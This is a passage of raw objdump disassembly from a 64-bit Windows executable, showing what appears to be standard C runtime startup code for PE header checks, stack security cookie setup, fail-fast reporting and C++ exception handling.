   140004226:	e8 f1 43 00 00       	call   0x14000861c
   14000422b:	85 c0                	test   %eax,%eax
   14000422d:	74 2e                	je     0x14000425d
   14000422f:	32 c0                	xor    %al,%al
   140004231:	eb 33                	jmp    0x140004266
   140004233:	66 0f 6f 05 65 f7 00 	movdqa 0xf765(%rip),%xmm0        # 0x1400139a0
   14000423a:	00 
   14000423b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000423f:	f3 0f 7f 05 b1 ae 01 	movdqu %xmm0,0x1aeb1(%rip)        # 0x14001f0f8
   140004246:	00 
   140004247:	48 89 05 ba ae 01 00 	mov    %rax,0x1aeba(%rip)        # 0x14001f108
   14000424e:	f3 0f 7f 05 ba ae 01 	movdqu %xmm0,0x1aeba(%rip)        # 0x14001f110
   140004255:	00 
   140004256:	48 89 05 c3 ae 01 00 	mov    %rax,0x1aec3(%rip)        # 0x14001f120
   14000425d:	c6 05 8d ae 01 00 01 	movb   $0x1,0x1ae8d(%rip)        # 0x14001f0f1
   140004264:	b0 01                	mov    $0x1,%al
   140004266:	48 83 c4 20          	add    $0x20,%rsp
   14000426a:	5b                   	pop    %rbx
   14000426b:	c3                   	ret
   14000426c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004271:	e8 6e 02 00 00       	call   0x1400044e4
   140004276:	cc                   	int3
   140004277:	cc                   	int3
   140004278:	48 83 ec 18          	sub    $0x18,%rsp
   14000427c:	4c 8b c1             	mov    %rcx,%r8
   14000427f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140004284:	66 39 05 75 bd ff ff 	cmp    %ax,-0x428b(%rip)        # 0x140000000
   14000428b:	75 78                	jne    0x140004305
   14000428d:	48 63 0d a8 bd ff ff 	movslq -0x4258(%rip),%rcx        # 0x14000003c
   140004294:	48 8d 15 65 bd ff ff 	lea    -0x429b(%rip),%rdx        # 0x140000000
   14000429b:	48 03 ca             	add    %rdx,%rcx
   14000429e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400042a4:	75 5f                	jne    0x140004305
   1400042a6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400042ab:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400042af:	75 54                	jne    0x140004305
   1400042b1:	4c 2b c2             	sub    %rdx,%r8
   1400042b4:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400042b8:	48 83 c2 18          	add    $0x18,%rdx
   1400042bc:	48 03 d1             	add    %rcx,%rdx
   1400042bf:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400042c3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400042c7:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400042cb:	48 89 14 24          	mov    %rdx,(%rsp)
   1400042cf:	49 3b d1             	cmp    %r9,%rdx
   1400042d2:	74 18                	je     0x1400042ec
   1400042d4:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400042d7:	4c 3b c1             	cmp    %rcx,%r8
   1400042da:	72 0a                	jb     0x1400042e6
   1400042dc:	8b 42 08             	mov    0x8(%rdx),%eax
   1400042df:	03 c1                	add    %ecx,%eax
   1400042e1:	4c 3b c0             	cmp    %rax,%r8
   1400042e4:	72 08                	jb     0x1400042ee
   1400042e6:	48 83 c2 28          	add    $0x28,%rdx
   1400042ea:	eb df                	jmp    0x1400042cb
   1400042ec:	33 d2                	xor    %edx,%edx
   1400042ee:	48 85 d2             	test   %rdx,%rdx
   1400042f1:	75 04                	jne    0x1400042f7
   1400042f3:	32 c0                	xor    %al,%al
   1400042f5:	eb 14                	jmp    0x14000430b
   1400042f7:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400042fb:	7d 04                	jge    0x140004301
   1400042fd:	32 c0                	xor    %al,%al
   1400042ff:	eb 0a                	jmp    0x14000430b
   140004301:	b0 01                	mov    $0x1,%al
   140004303:	eb 06                	jmp    0x14000430b
   140004305:	32 c0                	xor    %al,%al
   140004307:	eb 02                	jmp    0x14000430b
   140004309:	32 c0                	xor    %al,%al
   14000430b:	48 83 c4 18          	add    $0x18,%rsp
   14000430f:	c3                   	ret
   140004310:	40 53                	rex push %rbx
   140004312:	48 83 ec 20          	sub    $0x20,%rsp
   140004316:	8a d9                	mov    %cl,%bl
   140004318:	e8 97 04 00 00       	call   0x1400047b4
   14000431d:	33 d2                	xor    %edx,%edx
   14000431f:	85 c0                	test   %eax,%eax
   140004321:	74 0b                	je     0x14000432e
   140004323:	84 db                	test   %bl,%bl
   140004325:	75 07                	jne    0x14000432e
   140004327:	48 87 15 ba ad 01 00 	xchg   %rdx,0x1adba(%rip)        # 0x14001f0e8
   14000432e:	48 83 c4 20          	add    $0x20,%rsp
   140004332:	5b                   	pop    %rbx
   140004333:	c3                   	ret
   140004334:	40 53                	rex push %rbx
   140004336:	48 83 ec 20          	sub    $0x20,%rsp
   14000433a:	80 3d af ad 01 00 00 	cmpb   $0x0,0x1adaf(%rip)        # 0x14001f0f0
   140004341:	8a d9                	mov    %cl,%bl
   140004343:	74 04                	je     0x140004349
   140004345:	84 d2                	test   %dl,%dl
   140004347:	75 0c                	jne    0x140004355
   140004349:	e8 7e 44 00 00       	call   0x1400087cc
   14000434e:	8a cb                	mov    %bl,%cl
   140004350:	e8 fb 07 00 00       	call   0x140004b50
   140004355:	b0 01                	mov    $0x1,%al
   140004357:	48 83 c4 20          	add    $0x20,%rsp
   14000435b:	5b                   	pop    %rbx
   14000435c:	c3                   	ret
   14000435d:	cc                   	int3
   14000435e:	cc                   	int3
   14000435f:	cc                   	int3
   140004360:	40 53                	rex push %rbx
   140004362:	48 83 ec 20          	sub    $0x20,%rsp
   140004366:	48 83 3d 8a ad 01 00 	cmpq   $0xffffffffffffffff,0x1ad8a(%rip)        # 0x14001f0f8
   14000436d:	ff 
   14000436e:	48 8b d9             	mov    %rcx,%rbx
   140004371:	75 07                	jne    0x14000437a
   140004373:	e8 50 42 00 00       	call   0x1400085c8
   140004378:	eb 0f                	jmp    0x140004389
   14000437a:	48 8b d3             	mov    %rbx,%rdx
   14000437d:	48 8d 0d 74 ad 01 00 	lea    0x1ad74(%rip),%rcx        # 0x14001f0f8
   140004384:	e8 bb 42 00 00       	call   0x140008644
   140004389:	33 d2                	xor    %edx,%edx
   14000438b:	85 c0                	test   %eax,%eax
   14000438d:	48 0f 44 d3          	cmove  %rbx,%rdx
   140004391:	48 8b c2             	mov    %rdx,%rax
   140004394:	48 83 c4 20          	add    $0x20,%rsp
   140004398:	5b                   	pop    %rbx
   140004399:	c3                   	ret
   14000439a:	cc                   	int3
   14000439b:	cc                   	int3
   14000439c:	48 83 ec 28          	sub    $0x28,%rsp
   1400043a0:	e8 bb ff ff ff       	call   0x140004360
   1400043a5:	48 f7 d8             	neg    %rax
   1400043a8:	1b c0                	sbb    %eax,%eax
   1400043aa:	f7 d8                	neg    %eax
   1400043ac:	ff c8                	dec    %eax
   1400043ae:	48 83 c4 28          	add    $0x28,%rsp
   1400043b2:	c3                   	ret
   1400043b3:	cc                   	int3
   1400043b4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400043b9:	55                   	push   %rbp
   1400043ba:	48 8b ec             	mov    %rsp,%rbp
   1400043bd:	48 83 ec 30          	sub    $0x30,%rsp
   1400043c1:	48 8b 05 38 9c 01 00 	mov    0x19c38(%rip),%rax        # 0x14001e000
   1400043c8:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400043cf:	2b 00 00 
   1400043d2:	48 3b c3             	cmp    %rbx,%rax
   1400043d5:	75 77                	jne    0x14000444e
   1400043d7:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400043db:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1400043e2:	00 
   1400043e3:	ff 15 17 cd 00 00    	call   *0xcd17(%rip)        # 0x140011100
   1400043e9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400043ed:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400043f1:	ff 15 01 cd 00 00    	call   *0xcd01(%rip)        # 0x1400110f8
   1400043f7:	8b c0                	mov    %eax,%eax
   1400043f9:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400043fd:	ff 15 ed cc 00 00    	call   *0xcced(%rip)        # 0x1400110f0
   140004403:	8b c0                	mov    %eax,%eax
   140004405:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004409:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   14000440d:	ff 15 d5 cc 00 00    	call   *0xccd5(%rip)        # 0x1400110e8
   140004413:	8b 45 18             	mov    0x18(%rbp),%eax
   140004416:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000441a:	48 c1 e0 20          	shl    $0x20,%rax
   14000441e:	48 33 45 18          	xor    0x18(%rbp),%rax
   140004422:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140004426:	48 33 c1             	xor    %rcx,%rax
   140004429:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140004430:	ff 00 00 
   140004433:	48 23 c1             	and    %rcx,%rax
   140004436:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   14000443d:	2b 00 00 
   140004440:	48 3b c3             	cmp    %rbx,%rax
   140004443:	48 0f 44 c1          	cmove  %rcx,%rax
   140004447:	48 89 05 b2 9b 01 00 	mov    %rax,0x19bb2(%rip)        # 0x14001e000
   14000444e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004453:	48 f7 d0             	not    %rax
   140004456:	48 89 05 e3 9b 01 00 	mov    %rax,0x19be3(%rip)        # 0x14001e040
   14000445d:	48 83 c4 30          	add    $0x30,%rsp
   140004461:	5d                   	pop    %rbp
   140004462:	c3                   	ret
   140004463:	cc                   	int3
   140004464:	33 c0                	xor    %eax,%eax
   140004466:	c3                   	ret
   140004467:	cc                   	int3
   140004468:	b8 01 00 00 00       	mov    $0x1,%eax
   14000446d:	c3                   	ret
   14000446e:	cc                   	int3
   14000446f:	cc                   	int3
   140004470:	b8 00 40 00 00       	mov    $0x4000,%eax
   140004475:	c3                   	ret
   140004476:	cc                   	int3
   140004477:	cc                   	int3
   140004478:	48 8d 0d b1 ac 01 00 	lea    0x1acb1(%rip),%rcx        # 0x14001f130
   14000447f:	48 ff 25 82 cc 00 00 	rex.W jmp *0xcc82(%rip)        # 0x140011108
   140004486:	cc                   	int3
   140004487:	cc                   	int3
   140004488:	b0 01                	mov    $0x1,%al
   14000448a:	c3                   	ret
   14000448b:	cc                   	int3
   14000448c:	c2 00 00             	ret    $0x0
   14000448f:	cc                   	int3
   140004490:	48 8d 05 a9 ac 01 00 	lea    0x1aca9(%rip),%rax        # 0x14001f140
   140004497:	c3                   	ret
   140004498:	48 8d 05 a9 ac 01 00 	lea    0x1aca9(%rip),%rax        # 0x14001f148
   14000449f:	c3                   	ret
   1400044a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400044a4:	e8 e7 ff ff ff       	call   0x140004490
   1400044a9:	48 83 08 24          	orq    $0x24,(%rax)
   1400044ad:	e8 e6 ff ff ff       	call   0x140004498
   1400044b2:	48 83 08 02          	orq    $0x2,(%rax)
   1400044b6:	48 83 c4 28          	add    $0x28,%rsp
   1400044ba:	c3                   	ret
   1400044bb:	cc                   	int3
   1400044bc:	33 c0                	xor    %eax,%eax
   1400044be:	39 05 ac 9b 01 00    	cmp    %eax,0x19bac(%rip)        # 0x14001e070
   1400044c4:	0f 94 c0             	sete   %al
   1400044c7:	c3                   	ret
   1400044c8:	48 8d 05 41 b7 01 00 	lea    0x1b741(%rip),%rax        # 0x14001fc10
   1400044cf:	c3                   	ret
   1400044d0:	48 8d 05 31 b7 01 00 	lea    0x1b731(%rip),%rax        # 0x14001fc08
   1400044d7:	c3                   	ret
   1400044d8:	c7 05 6e ac 01 00 00 	movl   $0x0,0x1ac6e(%rip)        # 0x14001f150
   1400044df:	00 00 00 
   1400044e2:	c3                   	ret
   1400044e3:	cc                   	int3
   1400044e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400044e9:	55                   	push   %rbp
   1400044ea:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400044f1:	ff 
   1400044f2:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400044f9:	8b d9                	mov    %ecx,%ebx
   1400044fb:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004500:	ff 15 da cb 00 00    	call   *0xcbda(%rip)        # 0x1400110e0
   140004506:	85 c0                	test   %eax,%eax
   140004508:	74 04                	je     0x14000450e
   14000450a:	8b cb                	mov    %ebx,%ecx
   14000450c:	cd 29                	int    $0x29
   14000450e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004513:	e8 c0 ff ff ff       	call   0x1400044d8
   140004518:	33 d2                	xor    %edx,%edx
   14000451a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000451e:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140004524:	e8 d7 bc 00 00       	call   0x140010200
   140004529:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000452d:	ff 15 75 cb 00 00    	call   *0xcb75(%rip)        # 0x1400110a8
   140004533:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   14000453a:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140004541:	48 8b cb             	mov    %rbx,%rcx
   140004544:	45 33 c0             	xor    %r8d,%r8d
   140004547:	ff 15 63 cb 00 00    	call   *0xcb63(%rip)        # 0x1400110b0
   14000454d:	48 85 c0             	test   %rax,%rax
   140004550:	74 3f                	je     0x140004591
   140004552:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140004559:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140004560:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140004567:	00 00 
   140004569:	4c 8b c8             	mov    %rax,%r9
   14000456c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004571:	4c 8b c3             	mov    %rbx,%r8
   140004574:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   14000457b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004580:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004584:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004589:	33 c9                	xor    %ecx,%ecx
   14000458b:	ff 15 27 cb 00 00    	call   *0xcb27(%rip)        # 0x1400110b8
   140004591:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140004598:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000459d:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400045a4:	33 d2                	xor    %edx,%edx
   1400045a6:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400045ad:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400045b3:	48 83 c0 08          	add    $0x8,%rax
   1400045b7:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400045be:	e8 3d bc 00 00       	call   0x140010200
   1400045c3:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400045ca:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400045cf:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400045d6:	40 
   1400045d7:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400045de:	00 
   1400045df:	ff 15 2b cb 00 00    	call   *0xcb2b(%rip)        # 0x140011110
   1400045e5:	8b d8                	mov    %eax,%ebx
   1400045e7:	33 c9                	xor    %ecx,%ecx
   1400045e9:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400045ee:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400045f3:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400045f7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400045fc:	ff 15 c6 ca 00 00    	call   *0xcac6(%rip)        # 0x1400110c8
   140004602:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004607:	ff 15 b3 ca 00 00    	call   *0xcab3(%rip)        # 0x1400110c0
   14000460d:	85 c0                	test   %eax,%eax
   14000460f:	75 0d                	jne    0x14000461e
   140004611:	83 fb 01             	cmp    $0x1,%ebx
   140004614:	74 08                	je     0x14000461e
   140004616:	8d 48 03             	lea    0x3(%rax),%ecx
   140004619:	e8 ba fe ff ff       	call   0x1400044d8
   14000461e:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140004625:	00 
   140004626:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   14000462d:	5d                   	pop    %rbp
   14000462e:	c3                   	ret
   14000462f:	cc                   	int3
   140004630:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140004637:	33 d2                	xor    %edx,%edx
   140004639:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000463e:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140004642:	e8 b9 bb 00 00       	call   0x140010200
   140004647:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000464c:	ff 15 c6 ca 00 00    	call   *0xcac6(%rip)        # 0x140011118
   140004652:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140004657:	b8 0a 00 00 00       	mov    $0xa,%eax
   14000465c:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   140004662:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140004669:	c3                   	ret
   14000466a:	cc                   	int3
   14000466b:	cc                   	int3
   14000466c:	e9 f3 fd ff ff       	jmp    0x140004464
   140004671:	cc                   	int3
   140004672:	cc                   	int3
   140004673:	cc                   	int3
   140004674:	48 83 ec 28          	sub    $0x28,%rsp
   140004678:	33 c9                	xor    %ecx,%ecx
   14000467a:	ff 15 a0 ca 00 00    	call   *0xcaa0(%rip)        # 0x140011120
   140004680:	48 85 c0             	test   %rax,%rax
   140004683:	74 3a                	je     0x1400046bf
   140004685:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000468a:	66 39 08             	cmp    %cx,(%rax)
   14000468d:	75 30                	jne    0x1400046bf
   14000468f:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140004693:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   14000469a:	75 23                	jne    0x1400046bf
   14000469c:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400046a1:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400046a6:	75 17                	jne    0x1400046bf
   1400046a8:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   1400046af:	0e 
   1400046b0:	76 0d                	jbe    0x1400046bf
   1400046b2:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400046b9:	00 
   1400046ba:	0f 95 c0             	setne  %al
   1400046bd:	eb 02                	jmp    0x1400046c1
   1400046bf:	32 c0                	xor    %al,%al
   1400046c1:	48 83 c4 28          	add    $0x28,%rsp
   1400046c5:	c3                   	ret
   1400046c6:	cc                   	int3
   1400046c7:	cc                   	int3
   1400046c8:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400046d8
   1400046cf:	48 ff 25 f2 c9 00 00 	rex.W jmp *0xc9f2(%rip)        # 0x1400110c8
   1400046d6:	cc                   	int3
   1400046d7:	cc                   	int3
   1400046d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046dd:	57                   	push   %rdi
   1400046de:	48 83 ec 20          	sub    $0x20,%rsp
   1400046e2:	48 8b 19             	mov    (%rcx),%rbx
   1400046e5:	48 8b f9             	mov    %rcx,%rdi
   1400046e8:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400046ee:	75 24                	jne    0x140004714
   1400046f0:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400046f4:	75 1e                	jne    0x140004714
   1400046f6:	8b 53 20             	mov    0x20(%rbx),%edx
   1400046f9:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400046ff:	74 20                	je     0x140004721
   140004701:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   140004707:	83 f8 01             	cmp    $0x1,%eax
   14000470a:	76 15                	jbe    0x140004721
   14000470c:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140004712:	74 0d                	je     0x140004721
   140004714:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004719:	33 c0                	xor    %eax,%eax
   14000471b:	48 83 c4 20          	add    $0x20,%rsp
   14000471f:	5f                   	pop    %rdi
   140004720:	c3                   	ret
   140004721:	e8 92 05 00 00       	call   0x140004cb8
   140004726:	48 89 18             	mov    %rbx,(%rax)
   140004729:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000472d:	e8 9a 05 00 00       	call   0x140004ccc
   140004732:	48 89 18             	mov    %rbx,(%rax)
   140004735:	e8 ca 40 00 00       	call   0x140008804
   14000473a:	cc                   	int3
   14000473b:	cc                   	int3
   14000473c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004741:	57                   	push   %rdi
   140004742:	48 83 ec 20          	sub    $0x20,%rsp
   140004746:	48 8d 1d 23 73 01 00 	lea    0x17323(%rip),%rbx        # 0x14001ba70
   14000474d:	48 8d 3d 1c 73 01 00 	lea    0x1731c(%rip),%rdi        # 0x14001ba70
   140004754:	eb 12                	jmp    0x140004768
   140004756:	48 8b 03             	mov    (%rbx),%rax
   140004759:	48 85 c0             	test   %rax,%rax
   14000475c:	74 06                	je     0x140004764
   14000475e:	ff 15 74 cb 00 00    	call   *0xcb74(%rip)        # 0x1400112d8
   140004764:	48 83 c3 08          	add    $0x8,%rbx
   140004768:	48 3b df             	cmp    %rdi,%rbx
   14000476b:	72 e9                	jb     0x140004756
   14000476d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004772:	48 83 c4 20          	add    $0x20,%rsp
   140004776:	5f                   	pop    %rdi
   140004777:	c3                   	ret
   140004778:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000477d:	57                   	push   %rdi
   14000477e:	48 83 ec 20          	sub    $0x20,%rsp
   140004782:	48 8d 1d f7 72 01 00 	lea    0x172f7(%rip),%rbx        # 0x14001ba80
   140004789:	48 8d 3d f0 72 01 00 	lea    0x172f0(%rip),%rdi        # 0x14001ba80
   140004790:	eb 12                	jmp    0x1400047a4
   140004792:	48 8b 03             	mov    (%rbx),%rax
   140004795:	48 85 c0             	test   %rax,%rax
   140004798:	74 06                	je     0x1400047a0
   14000479a:	ff 15 38 cb 00 00    	call   *0xcb38(%rip)        # 0x1400112d8
   1400047a0:	48 83 c3 08          	add    $0x8,%rbx
   1400047a4:	48 3b df             	cmp    %rdi,%rbx
   1400047a7:	72 e9                	jb     0x140004792
   1400047a9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400047ae:	48 83 c4 20          	add    $0x20,%rsp
   1400047b2:	5f                   	pop    %rdi
   1400047b3:	c3                   	ret
   1400047b4:	33 c0                	xor    %eax,%eax
   1400047b6:	39 05 44 b4 01 00    	cmp    %eax,0x1b444(%rip)        # 0x14001fc00
   1400047bc:	0f 95 c0             	setne  %al
   1400047bf:	c3                   	ret
   1400047c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400047c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400047ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400047cf:	57                   	push   %rdi
   1400047d0:	48 83 ec 20          	sub    $0x20,%rsp
   1400047d4:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400047d8:	48 8b fa             	mov    %rdx,%rdi
   1400047db:	48 8b d9             	mov    %rcx,%rbx
   1400047de:	74 3f                	je     0x14000481f
   1400047e0:	48 8b 09             	mov    (%rcx),%rcx
   1400047e3:	48 85 c9             	test   %rcx,%rcx
   1400047e6:	74 37                	je     0x14000481f
   1400047e8:	e8 c3 bd 00 00       	call   0x1400105b0
   1400047ed:	48 8d 68 01          	lea    0x1(%rax),%rbp
   1400047f1:	48 8b cd             	mov    %rbp,%rcx
   1400047f4:	e8 57 2d 00 00       	call   0x140007550
   1400047f9:	48 8b f0             	mov    %rax,%rsi
   1400047fc:	48 8b c8             	mov    %rax,%rcx
   1400047ff:	48 85 c0             	test   %rax,%rax
   140004802:	74 14                	je     0x140004818
   140004804:	4c 8b 03             	mov    (%rbx),%r8
   140004807:	48 8b d5             	mov    %rbp,%rdx
   14000480a:	e8 21 40 00 00       	call   0x140008830
   14000480f:	33 c9                	xor    %ecx,%ecx
   140004811:	48 89 37             	mov    %rsi,(%rdi)
   140004814:	c6 47 08 01          	movb   $0x1,0x8(%rdi)
   140004818:	e8 63 3a 00 00       	call   0x140008280
   14000481d:	eb 0a                	jmp    0x140004829
   14000481f:	48 8b 03             	mov    (%rbx),%rax
   140004822:	48 89 02             	mov    %rax,(%rdx)
   140004825:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140004829:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000482e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004833:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004838:	48 83 c4 20          	add    $0x20,%rsp
   14000483c:	5f                   	pop    %rdi
   14000483d:	c3                   	ret
   14000483e:	cc                   	int3
   14000483f:	cc                   	int3
   140004840:	40 53                	rex push %rbx
   140004842:	48 83 ec 20          	sub    $0x20,%rsp
   140004846:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   14000484a:	48 8b d9             	mov    %rcx,%rbx
   14000484d:	74 08                	je     0x140004857
   14000484f:	48 8b 09             	mov    (%rcx),%rcx
   140004852:	e8 29 3a 00 00       	call   0x140008280
   140004857:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000485b:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140004862:	48 83 c4 20          	add    $0x20,%rsp
   140004866:	5b                   	pop    %rbx
   140004867:	c3                   	ret
   140004868:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000486d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004872:	57                   	push   %rdi
   140004873:	48 83 ec 50          	sub    $0x50,%rsp
   140004877:	48 8b da             	mov    %rdx,%rbx
   14000487a:	48 8b f1             	mov    %rcx,%rsi
   14000487d:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140004882:	48 85 d2             	test   %rdx,%rdx
   140004885:	74 1d                	je     0x1400048a4
   140004887:	f6 02 10             	testb  $0x10,(%rdx)
   14000488a:	74 18                	je     0x1400048a4
   14000488c:	48 8b 09             	mov    (%rcx),%rcx
   14000488f:	48 83 c1 f8          	add    $0xfffffffffffffff8,%rcx
   140004893:	48 8b 01             	mov    (%rcx),%rax
   140004896:	48 8b 58 30          	mov    0x30(%rax),%rbx
   14000489a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000489e:	ff 15 34 ca 00 00    	call   *0xca34(%rip)        # 0x1400112d8
   1400048a4:	33 c0                	xor    %eax,%eax
   1400048a6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048ab:	48 85 db             	test   %rbx,%rbx
   1400048ae:	74 22                	je     0x1400048d2
   1400048b0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400048b5:	48 8b cb             	mov    %rbx,%rcx
   1400048b8:	ff 15 6a c8 00 00    	call   *0xc86a(%rip)        # 0x140011128
   1400048be:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048c3:	f6 03 08             	testb  $0x8,(%rbx)
   1400048c6:	75 05                	jne    0x1400048cd
   1400048c8:	48 85 c0             	test   %rax,%rax
   1400048cb:	75 05                	jne    0x1400048d2
   1400048cd:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1400048d2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400048d7:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400048dc:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400048e1:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400048e6:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400048eb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400048f0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400048f5:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400048f9:	ff 15 31 c8 00 00    	call   *0xc831(%rip)        # 0x140011130
   1400048ff:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140004904:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140004909:	48 83 c4 50          	add    $0x50,%rsp
   14000490d:	5f                   	pop    %rdi
   14000490e:	c3                   	ret
   14000490f:	cc                   	int3
   140004910:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004915:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000491a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000491f:	57                   	push   %rdi
   140004920:	41 54                	push   %r12
   140004922:	41 55                	push   %r13
   140004924:	41 56                	push   %r14
   140004926:	41 57                	push   %r15
   140004928:	48 83 ec 40          	sub    $0x40,%rsp
   14000492c:	48 8b f1             	mov    %rcx,%rsi
   14000492f:	4d 8b f9             	mov    %r9,%r15
   140004932:	49 8b c8             	mov    %r8,%rcx
   140004935:	49 8b e8             	mov    %r8,%rbp
